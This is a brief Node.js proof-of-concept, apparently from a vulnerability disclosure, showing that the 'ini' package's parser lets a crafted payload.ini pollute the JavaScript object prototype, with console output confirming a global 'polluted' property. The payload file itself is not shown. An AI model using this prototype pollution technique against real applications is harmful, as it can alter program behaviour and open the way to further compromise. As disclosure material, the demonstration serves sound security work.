var fs = require('fs')
var ini = require('ini')

var parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))
console.log(parsed)
console.log(parsed.__proto__)
console.log(polluted)
> node poc.js
{}
{ polluted: 'polluted' }
{ polluted: 'polluted' }
polluted
